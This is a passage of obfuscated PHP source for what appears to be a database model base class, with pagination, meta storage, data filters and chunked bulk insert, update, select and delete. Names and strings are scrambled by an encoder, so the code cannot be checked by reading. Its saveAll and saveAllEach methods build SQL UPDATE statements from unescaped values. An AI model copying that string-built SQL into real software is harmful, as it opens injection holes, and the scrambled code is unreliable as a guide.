return get_class($this) . $ÍëÆÔÓ³[11] . $éÓ®©³‡ . $ÍëÆÔÓ³[360] . $÷ÓÇˆÊ­; } protected function selectPageReset() { $åïêÔ³Ç =& $_SERVER[Ôó‡è­ƒ]; if (isset($GLOBALS[$åïêÔ³Ç[361]])) { return; } $GLOBALS[$åïêÔ³Ç[361]] = isset($GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[362]]) ? $GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[362]] : !1; $GLOBALS[$åïêÔ³Ç[363]] = isset($GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[352]]) ? $GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[352]] : !1; $GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[362]] = !1; $GLOBALS[$åïêÔ³Ç[7]][$åïêÔ³Ç[352]] = !1; } protected function selectPageRestore() { $ˆ‡ÕÀıó =& $_SERVER[Ôó‡è­ƒ]; if (!isset($GLOBALS[$ˆ‡ÕÀıó[361]])) { return; } $GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[362]] = $GLOBALS[$ˆ‡ÕÀıó[361]]; $GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[352]] = $GLOBALS[$ˆ‡ÕÀıó[363]]; if ($GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[362]] === !1) { unset($GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[362]]); } if ($GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[352]] === !1) { unset($GLOBALS[$ˆ‡ÕÀıó[7]][$ˆ‡ÕÀıó[352]]); } unset($GLOBALS[$ˆ‡ÕÀıó[361]]); unset($GLOBALS[$ˆ‡ÕÀıó[363]]); } protected function selectPage($ŒÌûËø = 200, $ªÔß»Å = 1) { $ôÚ²ª´¿ =& $_SERVER[Ôó‡è­ƒ]; global $in; $¿ŸèÆ– = $this->optionsValue(); $‚™ºÍÆ• = 50000; $ŒÌûËø = isset($in[$ôÚ²ª´¿[362]]) && $in[$ôÚ²ª´¿[362]] ? $in[$ôÚ²ª´¿[362]] : $ŒÌûËø; if ($ŒÌûËø === -1) { $in[$ôÚ²ª´¿[362]] = !1; $‚™ºÍÆ• = 100000000; $ŒÌûËø = $‚™ºÍÆ•; } $èæÅ¹É“ = $¿ŸèÆ–; $èæÅ¹É“[$ôÚ²ª´¿[364]] = array(); $ŒÌûËø = intval($ŒÌûËø); $ŒÌûËø = $ŒÌûËø <= 5 ? 5 : ($ŒÌûËø >= $‚™ºÍÆ• ? $‚™ºÍÆ• : $ŒÌûËø); $ªÔß»Å = intval(isset($in[$ôÚ²ª´¿[352]]) && $in[$ôÚ²ª´¿[352]] ? $in[$ôÚ²ª´¿[352]] : $ªÔß»Å); $ªÔß»Å = $ªÔß»Å <= 1 ? 1 : $ªÔß»Å; $ÃÓ”Ê¤¯ = array(); $­é®¿‰¤ = 1; if ($ªÔß»Å == 1 && $­é®¿‰¤) { $this->optionsValue($¿ŸèÆ–); $ÃÓ”Ê¤¯ = $this->page($ªÔß»Å, $ŒÌûËø)->select(); $«•±Ï´Å = is_array($ÃÓ”Ê¤¯) ? count($ÃÓ”Ê¤¯) : 0; if ($«•±Ï´Å < $ŒÌûËø) { $ÅÑèœ“ê = 1; } else { $this->optionsValue($èæÅ¹É“); $«•±Ï´Å = intval($this->count()); $ÅÑèœ“ê = ceil($«•±Ï´Å / $ŒÌûËø); } } else { $this->optionsValue($èæÅ¹É“); $«•±Ï´Å = intval($this->count()); $ÅÑèœ“ê = ceil($«•±Ï´Å / $ŒÌûËø); $ªÔß»Å = $ªÔß»Å >= $ÅÑèœ“ê ? $ÅÑèœ“ê : $ªÔß»Å; $this->optionsValue($¿ŸèÆ–); $ÃÓ”Ê¤¯ = $this->page($ªÔß»Å, $ŒÌûËø)->select(); } if (!is_array($ÃÓ”Ê¤¯)) { $ÃÓ”Ê¤¯ = array(); } if ($ÅÑèœ“ê == 1) { $«•±Ï´Å = count($ÃÓ”Ê¤¯); } $¸¡˜ıˆ = array($ôÚ²ª´¿[365] => array($ôÚ²ª´¿[366] => $«•±Ï´Å, $ôÚ²ª´¿[362] => $ŒÌûËø, $ôÚ²ª´¿[352] => $ªÔß»Å, $ôÚ²ª´¿[367] => $ÅÑèœ“ê), $ôÚ²ª´¿[368] => $ÃÓ”Ê¤¯); return $¸¡˜ıˆ; } protected function checkLength($”æËÍÍÂ, $³‰‚İÒï = 0, $µÊÒÁÚª = '') { $‚­¾Âã  =& $_SERVER[Ôó‡è­ƒ]; $³‰‚İÒï = $³‰‚İÒï ? $³‰‚İÒï : 65536; if (!$”æËÍÍÂ || strlen($”æËÍÍÂ) < $³‰‚İÒï) { return; } $µÊÒÁÚª = $µÊÒÁÚª ? $µÊÒÁÚª . $‚­¾Âã [71] : $‚­¾Âã [12]; show_json($µÊÒÁÚª . LNG($‚­¾Âã [369]) . "\50{$³‰‚İÒï}\51", !1); } protected function metaSet($‡£€İ„Ã, $ ·À€¯£ = null, $âÄ¥ïÂ = null) { $½œ½Ñ¨« =& $_SERVER[Ôó‡è­ƒ]; if (!$this->tableMeta || !$‡£€İ„Ã) { return !1; } $³ş§¯›Ã = $this->tableMeta[$½œ½Ñ¨«[370]]; $±Ù¼‰ıı = $this->tableMeta[$½œ½Ñ¨«[371]]; $Ğ²êÎÍâ = Model($±Ù¼‰ıı); $€ˆ‹–»ş = array($³ş§¯›Ã => $‡£€İ„Ã, $½œ½Ñ¨«[372] => $ ·À€¯£); if (is_null($ ·À€¯£)) { return $Ğ²êÎÍâ->where(array($³ş§¯›Ã => $‡£€İ„Ã))->delete(); } if (is_null($âÄ¥ïÂ) && is_string($ ·À€¯£)) { return $Ğ²êÎÍâ->where($€ˆ‹–»ş)->delete(); } $îÏÔ¬ = is_array($ ·À€¯£) ? $ ·À€¯£ : array(); if (is_string($ ·À€¯£)) { $îÏÔ¬[$ ·À€¯£] = $âÄ¥ïÂ; } $Éµ¯·Õ’ = array(); foreach ($îÏÔ¬ as $Ÿ¯¦ö£š => $öã»»ù) { if (is_null($öã»»ù) && is_string($Ÿ¯¦ö£š)) { $Ğ²êÎÍâ->where(array($³ş§¯›Ã => $‡£€İ„Ã, $½œ½Ñ¨«[372] => $Ÿ¯¦ö£š))->delete(); continue; } $this->checkLength($öã»»ù, !1, $±Ù¼‰ıı . $½œ½Ñ¨«[4] . $Ÿ¯¦ö£š); $Éµ¯·Õ’[] = array($³ş§¯›Ã => $‡£€İ„Ã, $½œ½Ñ¨«[95] => $Ÿ¯¦ö£š, $½œ½Ñ¨«[373] => $öã»»ù); } $€¼ŸÖù‘ = $½œ½Ñ¨«[374] . $±Ù¼‰ıı; CacheLock::lock($€¼ŸÖù‘); $Ğ²êÎÍâ->where(array($³ş§¯›Ã => $‡£€İ„Ã))->addAll($Éµ¯·Õ’, array(), !0); CacheLock::unlock($€¼ŸÖù‘); return !0; } public function metaGet($æÖèšã¬, $ÑÒùšÌ¼ = false) { $õóµ¡’‚ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->tableMeta) { return array(); } $§°¬Ëè° = $this->tableMeta[$õóµ¡’‚[370]]; $„”ÂË£¾ = Model($this->tableMeta[$õóµ¡’‚[371]]); if ($ÑÒùšÌ¼) { $Š±»ù” = array($§°¬Ëè° => $æÖèšã¬, $õóµ¡’‚[95] => $ÑÒùšÌ¼); return $„”ÂË£¾->where($Š±»ù”)->getField($õóµ¡’‚[373]); } $Š±»ù” = array($§°¬Ëè° => $æÖèšã¬); $¿…ãæ›ï = $„”ÂË£¾->field($õóµ¡’‚[375])->where($Š±»ù”)->select(); $¿…ãæ›ï = array_to_keyvalue($¿…ãæ›ï, $õóµ¡’‚[95], $õóµ¡’‚[373]); return $¿…ãæ›ï; } private function checkDataAutoHas($£Ÿ•„î…) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $öôôöÖê) { if (in_array($£Ÿ•„î…, explode($_SERVER[Ôó‡è­ƒ][50], $öôôöÖê[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$’“éÚ€, $’ªöÄ´) { $ñ¿š§İœ =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($’“éÚ€)) { return; } foreach ($this->dataAuto as $¦âÚ Ûú) { $«´«œÈ = $¦âÚ Ûú[0]; if (!in_array($’ªöÄ´, explode($ñ¿š§İœ[50], $¦âÚ Ûú[2]))) { continue; } switch (trim($¦âÚ Ûú[3])) { case $ñ¿š§İœ[320]: case $ñ¿š§İœ[321]: $ƒùÀÅŒ = $¦âÚ Ûú[1]; $°õ¨“Ä„ = isset($¦âÚ Ûú[4]) ? (array) $¦âÚ Ûú[4] : array(); if ($ƒùÀÅŒ == $ñ¿š§İœ[200] && array_key_exists($«´«œÈ, $’“éÚ€)) { if (!$’“éÚ€[$«´«œÈ]) { unset($’“éÚ€[$«´«œÈ]); } break; } if (isset($’“éÚ€[$«´«œÈ])) { array_unshift($°õ¨“Ä„, $’“éÚ€[$«´«œÈ]); } if ($ñ¿š§İœ[320] == $¦âÚ Ûú[3]) { $’“éÚ€[$«´«œÈ] = call_user_func_array($ƒùÀÅŒ, $°õ¨“Ä„); } else { $’“éÚ€[$«´«œÈ] = call_user_func_array(array(&$this, $ƒùÀÅŒ), $°õ¨“Ä„); } break; case $ñ¿š§İœ[269]: if (isset($’“éÚ€[$«´«œÈ]) && $’“éÚ€[$«´«œÈ]) { $’“éÚ€[$«´«œÈ] = call_user_func_array(array(&$this, $¦âÚ Ûú[1]), array($’“éÚ€[$«´«œÈ])); } break; case $ñ¿š§İœ[272]: $’“éÚ€[$«´«œÈ] = $’“éÚ€[$¦âÚ Ûú[1]]; break; case $ñ¿š§İœ[293]: if (isset($’“éÚ€[$«´«œÈ]) && !is_string($’“éÚ€[$«´«œÈ])) { $’“éÚ€[$«´«œÈ] = json_encode_force($’“éÚ€[$«´«œÈ]); } break; case $ñ¿š§İœ[322]: if ($’“éÚ€[$«´«œÈ] === $ñ¿š§İœ[12]) { unset($’“éÚ€[$«´«œÈ]); } break; case $ñ¿š§İœ[323]: $’“éÚ€[$«´«œÈ] = $¦âÚ Ûú[1]; default: break; } } if ($’ªöÄ´ == $ñ¿š§İœ[354]) { $ÎŞÈÛ÷ = strtolower($this->db->getDbType()); if (strpos($ÎŞÈÛ÷, $ñ¿š§İœ[13]) !== 0) { return; } $§şÎù§‹ = $this->field(!0)->fields; $Şõê×‰è = $§şÎù§‹[$ñ¿š§İœ[251]]; if (isset($§şÎù§‹[$ñ¿š§İœ[250]])) { unset($Şõê×‰è[$§şÎù§‹[$ñ¿š§İœ[250]]]); } foreach ($Şõê×‰è as $åÎå‹ => $’ªöÄ´) { if (!isset($’“éÚ€[$åÎå‹])) { $’“éÚ€[$åÎå‹] = $ñ¿š§İœ[12]; } } } } private function dataAfterFilter(&$Í±œÖ) { $‹ş˜§²í =& $_SERVER[Ôó‡è­ƒ]; foreach ($this->dataAuto as $íé›ûİé) { $ÊìÁÏ…ô = $íé›ûİé[0]; if (!isset($Í±œÖ[$ÊìÁÏ…ô])) { continue; } if (!in_array($‹ş˜§²í[356], explode($‹ş˜§²í[50], $íé›ûİé[2]))) { continue; } switch (trim($íé›ûİé[3])) { case $‹ş˜§²í[320]: case $‹ş˜§²í[321]: $¤ËŠıá­ = isset($íé›ûİé[4]) ? (array) $íé›ûİé[4] : array(); array_unshift($¤ËŠıá­, $Í±œÖ[$ÊìÁÏ…ô]); if (isset($íé›ûİé[4]) && $íé›ûİé[4] == $‹ş˜§²í[376]) { $¤ËŠıá­ = array($Í±œÖ[$ÊìÁÏ…ô]); } if ($‹ş˜§²í[320] == $íé›ûİé[3]) { $Í±œÖ[$ÊìÁÏ…ô] = call_user_func_array($íé›ûİé[1], $¤ËŠıá­); } else { $Í±œÖ[$ÊìÁÏ…ô] = call_user_func_array(array(&$this, $íé›ûİé[1]), $¤ËŠıá­); } break; case $‹ş˜§²í[269]: if (isset($Í±œÖ[$ÊìÁÏ…ô]) && $Í±œÖ[$ÊìÁÏ…ô]) { $Í±œÖ[$ÊìÁÏ…ô] = call_user_func_array(array(&$this, $íé›ûİé[1]), array($Í±œÖ[$ÊìÁÏ…ô])); } break; case $‹ş˜§²í[272]: $Í±œÖ[$ÊìÁÏ…ô] = $Í±œÖ[$íé›ûİé[1]]; break; case $‹ş˜§²í[293]: $«¸ÂÀĞ = $Í±œÖ[$ÊìÁÏ…ô]; $Í±œÖ[$ÊìÁÏ…ô] = json_decode($«¸ÂÀĞ, !0); if (is_null($Í±œÖ[$ÊìÁÏ…ô])) { $Í±œÖ[$ÊìÁÏ…ô] = $«¸ÂÀĞ; } break; case $‹ş˜§²í[322]: if ($Í±œÖ[$ÊìÁÏ…ô] === $‹ş˜§²í[12]) { unset($Í±œÖ[$ÊìÁÏ…ô]); } break; case $‹ş˜§²í[323]: $Í±œÖ[$ÊìÁÏ…ô] = $íé›ûİé[1]; break; default: break; } } } public function saveAll($ù± ÚòÀ) { $«ÎÈŞĞì =& $_SERVER[Ôó‡è­ƒ]; $«„Ú’üÛ = $this->tablePrefix . $this->tableName; $ŠíÏç¾ = self::SQL_WHERE_IN_CHUNK; $ù± ÚòÀ = is_array($ù± ÚòÀ) ? $ù± ÚòÀ : array(); $À¶àóû = $«ÎÈŞĞì[377]; $Õ›ÂôÒ¡ = 0; $€”ÇòèÂ = array(); $ÎÁ×Ò– = count($ù± ÚòÀ); for ($†·şº–÷ = 0; $†·şº–÷ < $ÎÁ×Ò–; $†·şº–÷++) { $Ëï€³òâ = $ù± ÚòÀ[$†·şº–÷]; if (!is_array($Ëï€³òâ) || count($Ëï€³òâ) != 4) { continue; } $æ¨ïİ²æ = "\x55\x50\x44\x41\124\x45\x20\x60{$«„Ú’üÛ}\140\40\x53\105\124\x20{$Ëï€³òâ[2]}\40\75\40\x43\101\x53\105\x20{$Ëï€³òâ[0]}\40\12"; if ($Õ›ÂôÒ¡ == 0) { $À¶àóû = $æ¨ïİ²æ; } $€”ÇòèÂ[] = $«ÎÈŞĞì[119] . $Ëï€³òâ[1] . $«ÎÈŞĞì[119]; $Õ›ÂôÒ¡++; $À¶àóû .= "\40\x57\110\x45\116\x20\x27{$Ëï€³òâ[1]}\x27\x20\x54\x48\105\116\40\x27{$Ëï€³òâ[3]}\47\x20\12"; if ($Õ›ÂôÒ¡ == $ŠíÏç¾ || $†·şº–÷ == $ÎÁ×Ò– - 1) { $ß¢íº‹ = implode($«ÎÈŞĞì[50], $€”ÇòèÂ); $À¶àóû .= "\x20\x45\x4e\x44\40\40\127\110\105\x52\x45\x20{$Ëï€³òâ[0]}\40\x49\x4e\x20\50{$ß¢íº‹}\51\x20"; $this->execute($À¶àóû); $Õ›ÂôÒ¡ = 0; $À¶àóû = $æ¨ïİ²æ; $this->chunkEventCheck(count($€”ÇòèÂ)); $€”ÇòèÂ = array(); } } $this->chunkEventSet(); } public function saveAllEach($µ•™íìä) { $¡ Ø•Û› =& $_SERVER[Ôó‡è­ƒ]; $ÔÔ‡ËÀ = $this->tablePrefix . $this->tableName; foreach ($µ•™íìä as $›È¾ü‰û) { if (!is_array($›È¾ü‰û) || count($›È¾ü‰û) != 4) { continue; } $Äı’ÒÚİ = $›È¾ü‰û[0] . $¡ Ø•Û›[378] . $›È¾ü‰û[1] . $¡ Ø•Û›[119]; $¼ûµáğ´ = $›È¾ü‰û[2] . $¡ Ø•Û›[378] . $›È¾ü‰û[3] . $¡ Ø•Û›[119]; $õ†Éµú” = "\x75\x70\x64\x61\164\145\40{$ÔÔ‡ËÀ}\x20\x73\145\x74\x20{$¼ûµáğ´}\40\167\x68\145\162\x65\x20{$Äı’ÒÚİ}\73"; $this->execute($õ†Éµú”); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ŠâÑíê– = false, $ƒ®À¡í = false) { $this->_chunkEvent = $ŠâÑíê–; $this->_chunkEventParam = $ƒ®À¡í; } private function chunkEventCheck($‹€ÔêŒ‰) { if (!$this->_chunkEvent) { return; } $ÇÍĞ¹´“ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÇÍĞ¹´“[$_SERVER[Ôó‡è­ƒ][379]] = $‹€ÔêŒ‰; Hook::trigger($this->_chunkEvent, $ÇÍĞ¹´“); } public function addAll($•ãöìöæ, $Êü³ù‹ş = array(), $«áìê­˜ = false) { $—¡”Áûé =& $_SERVER[Ôó‡è­ƒ]; ignore_timeout(); $šµµ“üÌ = self::SQL_WHERE_IN_CHUNK; if (empty($•ãöìöæ)) { $this->error = think_lang($—¡”Áûé[270]); return !1; } $Êü³ù‹ş = $this->_parseOptions($Êü³ù‹ş); foreach ($•ãöìöæ as $ß›Üµæº => $à™Ë¥Û) { $•ãöìöæ[$ß›Üµæº] = $this->_facade($à™Ë¥Û); $this->_beforeInsert($•ãöìöæ[$ß›Üµæº], $Êü³ù‹ş); } if (method_exists($this->db, $—¡”Áûé[271])) { for ($ÂæÍû«¸ = 0; $ÂæÍû«¸ < count($•ãöìöæ); $ÂæÍû«¸ += $šµµ“üÌ) { $š¤¼ö•ö = array_slice($•ãöìöæ, $ÂæÍû«¸, $šµµ“üÌ); if (!is_array($š¤¼ö•ö) || count($š¤¼ö•ö) == 0) { break; } $ÊÀâØğ• = $this->db->insertAll($š¤¼ö•ö, $Êü³ù‹ş, $«áìê­˜); $this->chunkEventCheck(count($š¤¼ö•ö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($•ãöìöæ as $ß›Üµæº => $à™Ë¥Û) { $ÊÀâØğ• = $this->db->insert($à™Ë¥Û, $Êü³ù‹ş, $«áìê­˜); } $this->commit(); } if (!1 !== $ÊÀâØğ•) { $Ë¤ú×§½ = $this->getLastInsID(); if ($Ë¤ú×§½) { return $Ë¤ú×§½; } } return $ÊÀâØğ•; } public function save($‰şÔúƒƒ = '', $ŞĞüµæÀ = array()) { $ÅÙôÎÏÔ =& $_SERVER[Ôó‡è­ƒ]; $¥®æºÓµ = self::SQL_WHERE_IN_CHUNK; $• ùï¸¥ = $this->optionsValue(); $úï©­ê« = $this->findWhereField($• ùï¸¥); if (!$úï©­ê«) { return parent::save($‰şÔúƒƒ, $ŞĞüµæÀ); } $’ü‚¦ÎÅ = 0; $ÕáìØö’ = $• ùï¸¥[$ÅÙôÎÏÔ[274]][$úï©­ê«][1]; $ÕáìØö’ = is_array($ÕáìØö’) ? $ÕáìØö’ : array(); $½¹ÌÙ‰ = count($ÕáìØö’); for ($«çŸœ¥ = 0; $«çŸœ¥ < $½¹ÌÙ‰; $«çŸœ¥ += $¥®æºÓµ) { $µÕÛú› = array_slice($ÕáìØö’, $«çŸœ¥, $¥®æºÓµ); if (!is_array($µÕÛú›) || count($µÕÛú›) == 0) { break; } $• ùï¸¥[$ÅÙôÎÏÔ[274]][$úï©­ê«][1] = $µÕÛú›; $this->optionsValue($• ùï¸¥); $’ü‚¦ÎÅ += parent::save($‰şÔúƒƒ, $ŞĞüµæÀ); $this->chunkEventCheck(count($µÕÛú›)); } $this->chunkEventSet(); return $’ü‚¦ÎÅ; } public function add($”“¾í…» = '', $™ÍœòĞ = array(), $µßâ—‘– = false) { if ($this->addTaskStatus && is_array($”“¾í…»)) { $this->addTaskData[] = $”“¾í…»; return; } return parent::add($”“¾í…», $™ÍœòĞ, $µßâ—‘–); } public function parseWhereLike($ôŒÀÏœü, $Ÿ¬ÂÜ¸Ô = '', $ˆ¨Ô²²° = false, &$Üİò‰Ñé = false) { $ïÜç‹Ç£ =& $_SERVER[Ôó‡è­ƒ]; $İ‡ˆ÷òƒ = $GLOBALS[$ïÜç‹Ç£[6]][$ïÜç‹Ç£[380]]; if (!$İ‡ˆ÷òƒ[$ïÜç‹Ç£[381]]) { return $ôŒÀÏœü; } if (!is_array($ôŒÀÏœü)) { return $ôŒÀÏœü; } $öü»¬Ò÷ = array(); $“¾Öˆ÷ = 0; foreach ($ôŒÀÏœü as $œè üÚÊ => $ş¹¤³—) { if (is_array($ş¹¤³—) && count($ş¹¤³—) == 2 && $ş¹¤³—[0] == $ïÜç‹Ç£[382] && is_string($ş¹¤³—[1]) && substr($ş¹¤³—[1], 0, 1) == $ïÜç‹Ç£[383] && substr($ş¹¤³—[1], strlen($ş¹¤³—[1]) - 1, 1) == $ïÜç‹Ç£[383]) { $Üİò‰Ñé = !0; $ë¿Õ¯‚š = is_string($œè üÚÊ) ? $œè üÚÊ : $Ÿ¬ÂÜ¸Ô; $úÛ‹ßı = substr($ş¹¤³—[1], 1, strlen($ş¹¤³—[1]) - 2); $úÛ‹ßı = $this->db->escapeString($úÛ‹ßı); if (!strpos($ë¿Õ¯‚š, $ïÜç‹Ç£[10])) { $ë¿Õ¯‚š = $ïÜç‹Ç£[384] . $ë¿Õ¯‚š . $ïÜç‹Ç£[384]; } $áã Ëí = $ïÜç‹Ç£[185] . $úÛ‹ßı . $ïÜç‹Ç£[185]; if ($İ‡ˆ÷òƒ[$ïÜç‹Ç£[385]]) { $áã Ëí = $ïÜç‹Ç£[386] . $úÛ‹ßı . $ïÜç‹Ç£[387]; if ($İ‡ˆ÷òƒ[$ïÜç‹Ç£[388]]) { $áã Ëí = $ïÜç‹Ç£[387] . $úÛ‹ßı . $ïÜç‹Ç£[386]; } } $öü»¬Ò÷[$“¾Öˆ÷] = $ïÜç‹Ç£[389] . $ë¿Õ¯‚š . $ïÜç‹Ç£[390] . $áã Ëí . $ïÜç‹Ç£[391]; $“¾Öˆ÷++; continue; } if (is_array($ş¹¤³—)) { $Ÿ¬ÂÜ¸Ô = is_string($œè üÚÊ) ? $œè üÚÊ : $Ÿ¬ÂÜ¸Ô; $ş¹¤³— = $this->parseWhereLike($ş¹¤³—, $Ÿ¬ÂÜ¸Ô, !0, $Üİò‰Ñé); } if (is_numeric($œè üÚÊ)) { $öü»¬Ò÷[$“¾Öˆ÷] = $ş¹¤³—; $“¾Öˆ÷++; } else { $öü»¬Ò÷[$œè üÚÊ] = $ş¹¤³—; } } if ($Üİò‰Ñé && !$ˆ¨Ô²²°) { } return $öü»¬Ò÷; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($È–ì”óˆ = array()) { $¢úêµèÉ =& $_SERVER[Ôó‡è­ƒ]; $ûÔúší’ = self::SQL_WHERE_IN_CHUNK; $ôöóÅÒ = $this->optionsValue(); $‰ãÙİÙó = $this->findWhereField($ôöóÅÒ); if (!$‰ãÙİÙó || isset($ôöóÅÒ[$¢úêµèÉ[291]]) || isset($ôöóÅÒ[$¢úêµèÉ[352]])) { return parent::select($È–ì”óˆ); } $Ï½ÔôòÏ = $ôöóÅÒ[$¢úêµèÉ[274]][$‰ãÙİÙó][1]; $Ï½ÔôòÏ = is_array($Ï½ÔôòÏ) ? $Ï½ÔôòÏ : array(); $ƒß­¯ú = null; for ($‹ëŸò = 0; $‹ëŸò < count($Ï½ÔôòÏ); $‹ëŸò += $ûÔúší’) { $ÙùÍ³æ = array_slice($Ï½ÔôòÏ, $‹ëŸò, $ûÔúší’); if (!is_array($ÙùÍ³æ) || count($ÙùÍ³æ) == 0) { break; } $ôöóÅÒ[$¢úêµèÉ[274]][$‰ãÙİÙó][1] = $ÙùÍ³æ; $this->optionsValue($ôöóÅÒ); $†çÌ™ = parent::select($È–ì”óˆ); if (!$†çÌ™) { continue; } $ƒß­¯ú = is_array($ƒß­¯ú) ? $ƒß­¯ú : array(); $ƒß­¯ú = array_merge($ƒß­¯ú, $†çÌ™); } return $ƒß­¯ú; } public function delete($Á®üé¹é = array()) { $„¾Å€ø‡ =& $_SERVER[Ôó‡è­ƒ]; $¸ä»¯ ‘ = self::SQL_WHERE_IN_CHUNK; $®Ñ¿ï§Ä = $this->optionsValue(); $ÑÆÏéš„ = $this->findWhereField($®Ñ¿ï§Ä); if (!$ÑÆÏéš„) { return parent::delete($Á®üé¹é); } $® À‚‹‹ = 0; $Ìûù¤à = $®Ñ¿ï§Ä[$„¾Å€ø‡[274]][$ÑÆÏéš„][1]; $Ìûù¤à = is_array($Ìûù¤à) ? $Ìûù¤à : array(); for ($ÇÉµ½ğ = 0; $ÇÉµ½ğ < count($Ìûù¤à); $ÇÉµ½ğ += $¸ä»¯ ‘) { $ÈÃ”¹ì¡ = array_slice($Ìûù¤à, $ÇÉµ½ğ, $¸ä»¯ ‘); if (!is_array($ÈÃ”¹ì¡) || count($ÈÃ”¹ì¡) == 0) { break; } $®Ñ¿ï§Ä[$„¾Å€ø‡[274]][$ÑÆÏéš„][1] = $ÈÃ”¹ì¡; $this->optionsValue($®Ñ¿ï§Ä); $® À‚‹‹ += parent::delete($Á®üé¹é); } return $® À‚‹‹; } private function findWhereField($®ŸÛ¼£) { $’‚™× =& $_SERVER[Ôó‡è­ƒ]; $‡… î‹‡ = self::SQL_WHERE_IN_CHUNK; if (!is_array($®ŸÛ¼£) || !is_array($®ŸÛ¼£[$’‚™×[274]])) { return !1; } foreach ($®ŸÛ¼£[$’‚™×[274]] as $–ü’Íú => $›¢ÛƒŒØ) { if (is_array($›¢ÛƒŒØ) && isset($›¢ÛƒŒØ[0]) && is_string($›¢ÛƒŒØ[0]) && strtolower($›¢ÛƒŒØ[0]) == $’‚™×[7] && is_array($›¢ÛƒŒØ[1]) && count($›¢ÛƒŒØ[1]) > $‡… î‹‡) { ignore_timeout(); return $–ü’Íú; } } return !1; } public function setMasterDB($Ùç‚Ü¦Ş = true) { think_config($_SERVER[Ôó‡è­ƒ][392], $Ùç‚Ü¦Ş); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($’©™¢¤¼ = false, $¸ğì˜í¯ = "\155\157\x64\151\x66\x79\x54\151\x6d\x65", $“Â×† = false) { $ë¿‚Ìã = Model($this->modelType)->get(!1, $this->optionType, !0); $ôâî ©ß = array_values($ë¿‚Ìã); if ($ôâî ©ß && $ôâî ©ß[0] && !is_array($ôâî ©ß[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ë¿‚Ìã = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ë¿‚Ìã) { return $’©™¢¤¼ ? null : array(); } if (!$’©™¢¤¼) { $ë¿‚Ìã = array_filter(array_values($ë¿‚Ìã)); return array_sort_by($ë¿‚Ìã, $¸ğì˜í¯, $“Â×†); } return $ë¿‚Ìã[$_SERVER[Ôó‡è­ƒ][393] . $’©™¢¤¼]; } public function insert($Ù£ñŞõÌ) { $Ã†øÙ¶Ô =& $_SERVER[Ôó‡è­ƒ]; $Ù£ñŞõÌ = array_field_key($Ù£ñŞõÌ, $this->field); $ÅÍ¥Ú§ = Model($this->modelType)->get($Ã†øÙ¶Ô[394], $this->optionType . $Ã†øÙ¶Ô[395]); $ÅÍ¥Ú§ = $ÅÍ¥Ú§ ? $ÅÍ¥Ú§ : 0; $Ù£ñŞõÌ[$Ã†øÙ¶Ô[396]] = ++$ÅÍ¥Ú§; $Ù£ñŞõÌ[$Ã†øÙ¶Ô[197]] = time(); $Ù£ñŞõÌ[$Ã†øÙ¶Ô[86]] = time(); Model($this->modelType)->set($Ã†øÙ¶Ô[394], $ÅÍ¥Ú§, $this->optionType . $Ã†øÙ¶Ô[395]); Model($this->modelType)->set($Ã†øÙ¶Ô[393] . $ÅÍ¥Ú§, $Ù£ñŞõÌ, $this->optionType); return $ÅÍ¥Ú§; } public function update($§†›„¶–, $…Êí«Èé) { $œ‚…ëõœ =& $_SERVER[Ôó‡è­ƒ]; $…Êí«Èé = array_field_key($…Êí«Èé, $this->field); $êô–é£  = $this->listData($§†›„¶–); if (!$êô–é£  || !$§†›„¶–) { return !1; } $…Êí«Èé = array_merge($êô–é£ , $…Êí«Èé); $…Êí«Èé[$œ‚…ëõœ[86]] = time(); return Model($this->modelType)->set($œ‚…ëõœ[393] . $§†›„¶–, $…Êí«Èé, $this->optionType); } public function remove($£Ï½•¢±) { if (!$£Ï½•¢±) { return !1; } return Model($this->modelType)->remove($_SERVER[Ôó‡è­ƒ][393] . $£Ï½•¢±, $this->optionType); } public function clear() { $†úÌ•ƒÁ =& $_SERVER[Ôó‡è­ƒ]; Model($this->modelType)->remove($†úÌ•ƒÁ[394], $this->optionType . $†úÌ•ƒÁ[395]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Œ™óäÙŠ, $…ÃÌúÉê) { if (!$…ÃÌúÉê) { return !1; } $ş¢íˆúû = $this->listData(); $ş¢íˆúû = array_to_keyvalue($ş¢íˆúû, $Œ™óäÙŠ); return isset($ş¢íˆúû[$…ÃÌúÉê]) ? $ş¢íˆúû[$…ÃÌúÉê] : !1; } public function findByName($»•ÂàÜ’) { return $this->findByKey($_SERVER[Ôó‡è­ƒ][32], $»•ÂàÜ’); } protected function resetData($±š×ìá¹) { $õÊˆãè» =& $_SERVER[Ôó‡è­ƒ]; $±š×ìá¹ = is_array($±š×ìá¹) ? $±š×ìá¹ : array(); $Æİ˜ñâã = array(); for ($•¢ö„÷ú = 0; $•¢ö„÷ú < count($±š×ìá¹); $•¢ö„÷ú++) { $Æİ˜ñâã[$õÊˆãè»[393] . $±š×ìá¹[$•¢ö„÷ú][$õÊˆãè»[396]]] = $±š×ìá¹[$•¢ö„÷ú]; } return Model($this->modelType)->set($Æİ˜ñâã, !1, $this->optionType); } private function 